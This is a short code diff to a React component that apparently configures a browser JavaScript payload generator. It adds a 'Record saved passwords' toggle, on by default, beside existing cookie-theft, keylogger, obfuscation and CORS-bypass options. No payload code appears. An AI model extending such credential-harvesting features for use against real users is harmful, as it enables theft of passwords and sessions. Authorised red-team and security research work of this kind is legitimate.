@@ -767,6 +767,7 @@ class Javascript extends Component {
       format: 'minified',
       cookies: true,
       storage: false,
+      passwords: true,
       keylogger: false,
       base64: true,
       bypassCors: false,
@@ -814,6 +815,7 @@ class Javascript extends Component {
     if (this.state.options.format == 'commented') params += "&comments=true"
     if (this.state.options.format == 'minified') params += "&minify=true"
     if (this.state.options.format == 'obfuscated') params += "&obfuscate=true"
+    if (this.state.options.passwords == false) params += "&passwords=false"
     if (this.state.options.keylogger == true) params += "&keylogger=true"
     if (this.state.options.base64 == false) params += "&base64=false"
     if (this.state.options.bypassCors == true) params += "&bypassCors=true"
@@ -904,6 +906,15 @@ class Javascript extends Component {
                       />
                     }
                     label="Record keystrokes (keylogger)"
+                  />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.passwords}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, passwords: checked } } )}
+                      />
+                    }
+                    label="Record saved passwords"
                   />
                   <FormControlLabel
                     control={
